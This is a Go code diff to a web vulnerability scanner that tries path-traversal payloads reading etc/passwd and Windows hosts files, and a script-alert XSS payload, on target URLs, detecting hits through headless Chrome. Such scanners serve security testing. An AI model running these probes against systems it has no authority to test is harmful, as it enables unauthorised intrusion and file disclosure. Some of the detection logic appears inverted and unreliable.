@@ -14,8 +14,6 @@ import (
 )
 
 func attackInput(baseSub string, baseDomain string, n *html.Node) {
-	wg.Add(1)
-	defer wg.Done()
 	for _, attr := range n.Attr {
 		if attr.Key == "type" && attr.Val == "password" && !isAuthorised {
 			fmt.Println("[!] found password field on: " + baseDomain + "\nWant to use authorisation? Use the -a flag!")
@@ -80,29 +78,27 @@ func setCookie(domain string) chromedp.ActionFunc {
 }
 
 func attemptLFI(domain string, client *http.Client) {
-	wg.Add(1)
-	defer wg.Done()
 	index := strings.Index(domain, "=")
 	if index != -1 {
 		domain = domain[:index] + "="
 	}
 
-	payloads := []string{"etc/passwd", "etc/passwd%00", "C:\\Windows\\System32\\drivers\\etc\\hosts", "\\etc\\hosts", "/etc/hosts"}
+	payloads := []string{"etc/passwd", "etc/hosts", "Windows/System32/drivers/etc/hosts"}
 	for _, payload := range payloads {
 		if doLFI(domain, client, payload) {
 			return
 		}
 	}
+	return
 }
 
 func attemptURLXSS(domain string, client *http.Client) {
-	wg.Add(1)
-	defer wg.Done()
 	index := strings.Index(domain, "=")
 	if index != -1 {
 		domain = domain[:index] + "="
 	}
 
+	// payloads := []string{"<script>alert(1)</script>"}
 	payloads := []string{"<script>alert(1)</script>"}
 	for _, payload := range payloads {
 		if doURLXSS(domain, client, payload) {
@@ -122,7 +118,7 @@ func doLFI(domain string, client *http.Client, payload string) bool {
 	}
 
 	for i := range 10 {
-		resp, err := client.Get(domain + strings.Repeat("../", i) + "etc/passwd")
+		resp, err := client.Get(domain + strings.Repeat("../", i) + payload)
 		if err != nil {
 			fmt.Errorf(err.Error())
 		}
@@ -151,43 +147,41 @@ func checkLFISuccess(resp *http.Response) bool {
 }
 
 func doURLXSS(domain string, client *http.Client, payload string) bool {
-	ctx, cancel := chromedp.NewContext(context.Background())
+	ctx, cancel := chromedp.NewContext(context.Background(),
+		chromedp.WithErrorf(func(format string, args ...interface{}) {
+		}),
+	)
 	defer cancel()
 
 	ctx, cancel = context.WithTimeout(ctx, 2*time.Second)
 	defer cancel()
 
 	// Variable to hold the alert text
-	var alertText string
+	alertFound := true
 
 	// Run chromedp tasks
 	err := chromedp.Run(ctx,
-		chromedp.Navigate(domain+payload), // Replace with your URL
+		setCookie(domain),
+		chromedp.Navigate(domain+payload), // navigate to random page
 		chromedp.ActionFunc(func(ctx context.Context) error {
-			// Enable JS dialog events to capture alerts
-			return chromedp.Evaluate(`window.alert = function(msg) { window.alertMsg = msg; }`, nil).Do(ctx)
+
+			alertFound = false
+			return nil
 		}),
-		chromedp.Click(`#triggerAlert`, chromedp.ByID), // Replace with the selector to trigger the alert
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			// Wait for the alert to be triggered
-			return chromedp.WaitReady("body", chromedp.ByQuery).Do(ctx)
-		}),
-		chromedp.Evaluate(`window.alertMsg`, &alertText), // Get the alert message
+
+		//chromedp.EvaluateAsDevTools(`window.alert = function (txt){return txt}`, &alertText),
 	)
 	if err != nil {
 		if err != context.DeadlineExceeded {
 			handleErr(err)
 		}
-		return false
+		if alertFound {
+			fmt.Println("[!!!] POTENTIAL XSS FOUND! " + domain + payload)
+			return true
+		}
 	}
 
 	// Print the alert message
-	if alertText == "1" {
-		fmt.Println("[!!!] POTENTIAL LFI FOUND! " + domain + payload)
-		return true
-	} else {
-		fmt.Println("No alert was triggered.")
-		return false
-	}
+	return false
 
 }
